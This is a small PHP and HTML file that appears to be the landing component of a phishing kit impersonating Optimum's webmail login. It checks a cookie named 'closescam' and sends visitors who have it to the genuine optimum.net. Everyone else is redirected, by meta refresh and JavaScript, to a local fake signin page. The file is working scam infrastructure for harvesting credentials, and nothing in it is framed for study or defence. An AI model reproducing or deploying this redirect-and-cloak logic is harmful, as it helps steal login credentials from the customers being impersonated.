<?php
$closed=$_COOKIE["closescam"];
if ($closed != ''){
header('location:https://www.optimum.net/');
}
?>
<html><head>
<meta http-equiv="refresh" content="0; URL=login.php?section=webmail/loginlogout/app/signin">
<script language="JavaScript" type="text/javascript">
<!--
function redirect() { 
setTimeout("window.location.replace('login.php?section=webmail/loginlogout/app/signin')", 0); }
-->
</script>
</head>
